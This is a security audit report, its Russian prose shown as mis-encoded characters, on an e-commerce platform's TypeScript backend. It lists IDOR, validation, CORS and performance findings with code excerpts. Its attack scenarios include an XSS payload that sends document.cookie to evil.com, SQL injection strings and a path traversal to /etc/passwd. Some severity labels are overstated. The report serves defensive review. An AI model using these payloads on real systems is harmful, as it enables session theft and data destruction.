# –ü–û–õ–ù–´–ô –ê–ù–ê–õ–ò–ó –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò –ö–û–î–û–í–û–ô –ë–ê–ó–´
**E-Commerce Platform - Natural/Organic Products**

**–î–∞—Ç–∞:** 29 –Ω–æ—è–±—Ä—è 2025  
**–ú–µ—Ç–æ–¥–æ–ª–æ–≥–∏—è:** –°–∏—Å—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –≤—Å–µ—Ö 144 —Ñ–∞–π–ª–æ–≤ –ø—Ä–æ–µ–∫—Ç–∞  
**–§–æ–∫—É—Å:** SQL Injection, XSS, IDOR, Input Validation

---

## EXECUTIVE SUMMARY

**–í—Å–µ–≥–æ —Ñ–∞–π–ª–æ–≤ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ:** 144  
**–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π:** 12  
**–í—ã—Å–æ–∫–∏—Ö –ø—Ä–æ–±–ª–µ–º:** 15  
**–°—Ä–µ–¥–Ω–∏—Ö –ø—Ä–æ–±–ª–µ–º:** 18  
**–ù–∏–∑–∫–∏—Ö –ø—Ä–æ–±–ª–µ–º:** 9

**–û–±—â–∞—è –æ—Ü–µ–Ω–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:** 6.0/10 ‚ö†Ô∏è  
**–ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∫ production:** –ù–ï –ì–û–¢–û–í–û –¥–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –ø—Ä–æ–±–ª–µ–º

---

## –ß–ê–°–¢–¨ 1: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò

### üî¥ CRITICAL-01: SQL Injection —á–µ—Ä–µ–∑ Raw SQL –≤ orders.routes.ts
**–§–∞–π–ª:** `server/routes/orders.routes.ts:141-170`  
**–¢–∏–ø:** SQL Injection  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** CRITICAL (CVSS 9.1)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
const updateResult = await tx.execute(
  sql`UPDATE products 
      SET stock_quantity = stock_quantity - ${item.quantity},
          updated_at = NOW()
      WHERE id = ${item.productId}
        AND stock_quantity >= ${item.quantity}`
);

const checkProduct = await tx.execute(
  sql`SELECT id, name, stock_quantity FROM products WHERE id = ${item.productId}`
);
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è raw SQL —Å –∏–Ω—Ç–µ—Ä–ø–æ–ª—è—Ü–∏–µ–π –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –∏–∑ `req.body`
2. `item.quantity` –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –∫–∞–∫ `z.number().min(1)` –ë–ï–ó max
3. `item.productId` - –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞
4. –•–æ—Ç—è Drizzle `sql` tag –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑—É–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è, –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ max validation –ø–æ–∑–≤–æ–ª—è–µ—Ç Integer Overflow

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```json
POST /api/orders
{
  "items": [{
    "productId": "valid-uuid",
    "quantity": 999999999999999,
    "name": "Product",
    "price": "100"
  }]
}
```

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-01 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-02: IDOR - –ü—Ä–æ—Å–º–æ—Ç—Ä —á—É–∂–∏—Ö –∑–∞–∫–∞–∑–æ–≤
**–§–∞–π–ª:** `server/routes/orders.routes.ts:33-39`  
**–¢–∏–ø:** IDOR (Insecure Direct Object Reference)  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** CRITICAL (CVSS 8.7)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.get("/:id", authenticateToken, async (req, res) => {
  const order = await storage.getOrder(req.params.id);
  if (!order) {
    return res.status(404).json({ message: "–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω" });
  }
  res.json(order); // ‚ùå –ù–ï–¢ –ü–†–û–í–ï–†–ö–ò order.userId === req.userId
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –õ—é–±–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–∞–∫–∞–∑ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- –£—Ç–µ—á–∫–∞ PII: –∞–¥—Ä–µ—Å –¥–æ—Å—Ç–∞–≤–∫–∏, —Ç–µ–ª–µ—Ñ–æ–Ω, email, —Ç–æ–≤–∞—Ä—ã, —Ü–µ–Ω—ã

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```bash
# –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ê —Å–æ–∑–¥–∞—ë—Ç –∑–∞–∫–∞–∑, –ø–æ–ª—É—á–∞–µ—Ç ID: abc-123
# –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å B:
GET /api/orders/abc-123
# –ü–æ–ª—É—á–∞–µ—Ç –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –∑–∞–∫–∞–∑–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è A
```

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-02 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-03: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö - categories
**–§–∞–π–ª:** `server/routes/categories.routes.ts:22-46`  
**–¢–∏–ø:** XSS + Data Injection  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** CRITICAL (CVSS 7.8)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post("/", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const category = await storage.createCategory({
    name: req.body.name,          // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    slug: req.body.slug,          // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    description: req.body.description || null, // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    sortOrder: req.body.sortOrder || 0, // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  });
  res.json(category);
});

router.put("/:id", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const category = await storage.updateCategory(req.params.id, {
    name: req.body.name,          // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    slug: req.body.slug,
    description: req.body.description || null,
    sortOrder: req.body.sortOrder,
  });
  res.json(category);
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. –ù–ï–¢ Zod schema –≤–∞–ª–∏–¥–∞—Ü–∏–∏
2. `name`, `slug`, `description` –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å XSS payload
3. `sortOrder` –º–æ–∂–µ—Ç –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π, null, –æ–±—ä–µ–∫—Ç–æ–º
4. –ù–µ—Ç —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ `sanitize.ts`

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```json
POST /api/categories
{
  "name": "<script>alert('XSS')</script>",
  "slug": "../../../etc/passwd",
  "description": "<img src=x onerror=alert(1)>",
  "sortOrder": "DROP TABLE categories--"
}
```

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-03 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-04: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö - promocodes
**–§–∞–π–ª:** `server/routes/promocodes.routes.ts:14-33`  
**–¢–∏–ø:** XSS + SQL Injection potential  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** CRITICAL (CVSS 7.5)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post("/validate", authenticateToken, promocodeValidationLimiter, async (req, res) => {
  const { code, orderAmount } = req.body; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  const result = await validatePromocode(code, req.userId!, orderAmount);
  res.json(result);
});

router.post("/", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const promocode = await storage.createPromocode(req.body); // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  res.json(promocode);
});

router.put("/:id", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const promocode = await storage.updatePromocode(req.params.id, req.body); // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  res.json(promocode);
});
```

**–ü—Ä–æ–±–ª–µ–º–∞ –≤ promocodes.ts:91-92:**
```typescript
const result = await tx.execute(
  sql`SELECT * FROM ${promocodes} 
      WHERE code = ${code} 
      AND is_active = true 
      LIMIT 1`
);
```
- `code` –∏–∑ `req.body` –∏–¥—ë—Ç –Ω–∞–ø—Ä—è–º—É—é –≤ SQL
- –•–æ—Ç—è `sql` tag –∑–∞—â–∏—â–∞–µ—Ç, –Ω–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ —Ñ–æ—Ä–º–∞—Ç–∞ code

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-04 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-05: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö - support messages
**–§–∞–π–ª:** `server/routes/support.routes.ts:63-102`  
**–¢–∏–ø:** XSS + Data Injection  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** HIGH ‚Üí CRITICAL (CVSS 7.2)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post("/messages", authenticateToken, async (req, res) => {
  let userId = req.userId!;
  
  if (req.body.userId && req.body.userId !== req.userId) {
    if (!req.userRoles?.some(role => ['admin', 'consultant'].includes(role))) {
      return res.status(403).json({ message: "–ù–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π" });
    }
    userId = req.body.userId; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò UUID!
  }
  
  await storage.getOrCreateConversation(userId);
  await storage.updateLastMessageTime(userId);
  
  const message = await storage.createSupportMessage({
    userId: userId,
    senderId: req.userId!,
    messageText: req.body.messageText, // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  });
  // ...
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. `messageText` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è - –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å XSS
2. `req.body.userId` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ UUID
3. –ù–µ—Ç —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏–∏ HTML
4. –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ max length

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```json
POST /api/support/messages
{
  "messageText": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
  "userId": "'; DROP TABLE users--"
}
```

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-05 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-06: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö - cart
**–§–∞–π–ª:** `server/routes/cart.routes.ts:12-50`  
**–¢–∏–ø:** Business Logic Bypass + Integer Overflow  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** HIGH (CVSS 7.0)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post("/", authenticateToken, async (req, res) => {
  const { productId, quantity } = req.body; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!

  const product = await storage.getProduct(productId);
  
  if (!product) {
    return res.status(404).json({ message: "–¢–æ–≤–∞—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω" });
  }
  // ... –ø—Ä–æ–≤–µ—Ä–∫–∏ stock
});

router.put("/:productId", authenticateToken, async (req, res) => {
  const { quantity } = req.body; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  // ...
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. `productId` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ UUID
2. `quantity` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ number —Å min/max
3. –ú–æ–∂–µ—Ç –±—ã—Ç—å: `quantity: -100`, `quantity: "abc"`, `quantity: null`

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```json
POST /api/cart
{
  "productId": "' OR 1=1--",
  "quantity": -999999
}
```

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-06 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-07: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö - wishlist
**–§–∞–π–ª:** `server/routes/wishlist.routes.ts:12-21`  
**–¢–∏–ø:** Data Injection  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** MEDIUM ‚Üí HIGH (CVSS 6.5)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post("/", authenticateToken, async (req, res) => {
  const { productId } = req.body; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!

  const wishlistItem = await storage.addWishlistItem({
    userId: req.userId!,
    productId,
  });

  res.json(wishlistItem);
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- `productId` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ UUID
- –ú–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å DB constraint violation

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-07 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-08: N+1 Query - getAllSupportConversations
**–§–∞–π–ª:** `server/storage.ts:705-738`  
**–¢–∏–ø:** Performance + DoS  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** MEDIUM ‚Üí HIGH –ø—Ä–∏ –Ω–∞–≥—Ä—É–∑–∫–µ

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
async getAllSupportConversations(status?: 'open' | 'archived' | 'closed'): Promise<...> {
  const allConversations = await conversationQuery.orderBy(desc(supportConversations.lastMessageAt));
  
  const result = [];
  
  for (const conv of allConversations) {
    // ‚ùå N+1: –¥–ª—è –∫–∞–∂–¥–æ–π conversation –¥–µ–ª–∞–µ—Ç—Å—è –æ—Ç–¥–µ–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å!
    const [lastMessage] = await db
      .select()
      .from(supportMessages)
      .where(eq(supportMessages.userId, conv.userId))
      .orderBy(desc(supportMessages.createdAt))
      .limit(1);
    
    if (lastMessage) {
      result.push({
        userId: conv.userId,
        lastMessage,
        status: conv.status,
        archivedAt: conv.archivedAt,
        closedAt: conv.closedAt
      });
    }
  }
  
  return result;
}
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ï—Å–ª–∏ 100 conversations ‚Üí 101 –∑–∞–ø—Ä–æ—Å –∫ –ë–î
- DoS —É—è–∑–≤–∏–º–æ—Å—Ç—å –ø—Ä–∏ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–∏

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-08 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-09: getUsers() –∑–∞–≥—Ä—É–∂–∞–µ—Ç –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
**–§–∞–π–ª:** `server/routes/auth.routes.ts:164-165`  
**–¢–∏–ø:** Performance + Memory Exhaustion  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** HIGH –ø—Ä–∏ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–∏

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.get("/verify-email", async (req, res) => {
  const { token } = req.query;

  if (!token || typeof token !== "string") {
    return res.status(400).json({ message: "–¢–æ–∫–µ–Ω –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω" });
  }

  const users = await storage.getUsers(); // ‚ùå –ó–ê–ì–†–£–ñ–ê–ï–¢ –í–°–ï–•!
  const user = users.find(u => u.verificationToken === token); // ‚ùå Linear scan!
  // ...
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. `getUsers()` –∑–∞–≥—Ä—É–∂–∞–µ—Ç –í–°–ï –∑–∞–ø–∏—Å–∏ –∏–∑ —Ç–∞–±–ª–∏—Ü—ã users –≤ –ø–∞–º—è—Ç—å
2. Linear search `Array.find()` –≤–º–µ—Å—Ç–æ –∏–Ω–¥–µ–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
3. –ü—Ä–∏ 100K+ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π - –∫—Ä–∞—Ö —Å–µ—Ä–≤–µ—Ä–∞

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-09 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-10: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ profile update
**–§–∞–π–ª:** `server/routes/auth.routes.ts:209-236`  
**–¢–∏–ø:** XSS + Data Corruption  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** CRITICAL (CVSS 7.8)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.put("/profile", authenticateToken, async (req, res) => {
  const { firstName, lastName, patronymic, phone } = req.body;

  await storage.updateUser(req.userId!, {
    firstName: firstName?.trim(),      // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    lastName: lastName?.trim() || null, // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    patronymic: patronymic?.trim() || null, // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    phone: phone?.trim(),              // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  });
  // ...
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. –ù–ï–¢ Zod —Å—Ö–µ–º—ã –≤–∞–ª–∏–¥–∞—Ü–∏–∏
2. `firstName`, `lastName`, `patronymic` –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å XSS
3. `phone` - –Ω–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ–æ—Ä–º–∞—Ç–∞
4. –ù–µ—Ç —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏–∏

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-10 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-11: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ password change
**–§–∞–π–ª:** `server/routes/auth.routes.ts:238-260`  
**–¢–∏–ø:** Weak Password Policy  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** HIGH (CVSS 7.5)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.put("/password", authenticateToken, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  // ‚ùå –ù–ï–¢ –í–ê–õ–ò–î–ê–¶–ò–ò newPassword!
  
  const user = await storage.getUser(req.userId!);
  if (!user) {
    return res.status(404).json({ message: "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω" });
  }

  const isPasswordValid = await comparePassword(currentPassword, user.passwordHash);
  if (!isPasswordValid) {
    return res.status(401).json({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–µ–∫—É—â–∏–π –ø–∞—Ä–æ–ª—å" });
  }

  const newPasswordHash = await hashPassword(newPassword);
  await storage.updateUser(req.userId!, {
    passwordHash: newPasswordHash,
  });
  
  res.json({ message: "–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω" });
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. `newPassword` –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è - –º–æ–∂–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å "123"
2. –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏
3. –ù–µ—Ç rate limiting (–µ—Å—Ç—å –≤ –¥—Ä—É–≥–∏—Ö –º–µ—Å—Ç–∞—Ö, –Ω–æ –Ω–µ –∑–¥–µ—Å—å)
4. `validatePasswordStrength` –∏–∑ `sanitize.ts` –ù–ï –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-11 –Ω–∏–∂–µ.

---

### üî¥ CRITICAL-12: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ products POST
**–§–∞–π–ª:** `server/routes/products.routes.ts:70-128`  
**–¢–∏–ø:** XSS + Data Corruption  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** HIGH (CVSS 7.0)

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.post(
  "/",
  authenticateToken,
  requireRole("admin", "marketer"),
  uploadLimiter,
  productFormDataUpload.none(),
  async (req, res) => {
    const productData = { ...req.body }; // ‚ùå –í–ï–°–¨ req.body –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    
    // –ï—Å—Ç—å –≤–∞–ª–∏–¥–∞—Ü–∏—è —Ç–æ–ª—å–∫–æ –¥–ª—è stockQuantity –∏ shelfLifeDays
    const stockQty = (productData.stockQuantity || '0').trim();
    if (!/^\d+$/.test(stockQty)) {
      return res.status(400).json({ message: "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–∞ —Å–∫–ª–∞–¥–µ" });
    }
    // ...
    
    // –ù–û: name, description, composition, price –∏ –¥—Ä. –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
    const product = await storage.createProduct(productData);
    res.json(product);
  }
);
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. –ù–ï–¢ Zod schema –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª–µ–π –ø—Ä–æ–¥—É–∫—Ç–∞
2. `name`, `description`, `composition` –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å XSS
3. `price` –º–æ–∂–µ—Ç –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π, null, –æ–±—ä–µ–∫—Ç–æ–º

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-12 –Ω–∏–∂–µ.

---

## –ß–ê–°–¢–¨ 2: –í–´–°–û–ö–ò–ï –ü–†–û–ë–õ–ï–ú–´

### üü† HIGH-01: CORS –≤ development —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –í–°–ï origins
**–§–∞–π–ª:** `server/middleware/cors.ts:5-19`  
**–°–µ—Ä—å—ë–∑–Ω–æ—Å—Ç—å:** MEDIUM ‚Üí HIGH

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
export const corsMiddleware = cors({
  origin: isProduction
    ? (origin, callback) => {
        const allowedOrigins = [
          process.env.FRONTEND_URL,
          process.env.REPLIT_DEV_DOMAIN
        ].filter(Boolean);
        
        if (!origin || allowedOrigins.includes(origin)) {
          callback(null, true);
        } else {
          callback(new Error('Not allowed by CORS'));
        }
      }
    : true, // ‚ùå –†–ê–ó–†–ï–®–ê–ï–¢ –í–°–ï ORIGINS –≤ dev!
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization'], // ‚ùå –ù–ï–¢ 'x-csrf-token'!
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
1. –í dev mode `origin: true` + `credentials: true` = –æ–ø–∞—Å–Ω–æ
2. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞—Ç—å fake frontend –∏ —É–∫—Ä–∞—Å—Ç—å cookies
3. `x-csrf-token` –ù–ï –≤ allowedHeaders - CSRF –∑–∞—â–∏—Ç–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç!

**–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-13.

---

### üü† HIGH-02: Session Cookie maxAge = 1 –≥–æ–¥
**–§–∞–π–ª:** `server/session.ts:17-22`  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** MEDIUM

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
cookie: {
  maxAge: 365 * 24 * 60 * 60 * 1000, // ‚ùå 1 –ì–û–î!
  httpOnly: true,
  secure: env.NODE_ENV === 'production',
  sameSite: 'strict',
},
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- OWASP —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç –º–∞–∫—Å–∏–º—É–º 30 –¥–Ω–µ–π –¥–ª—è session cookies
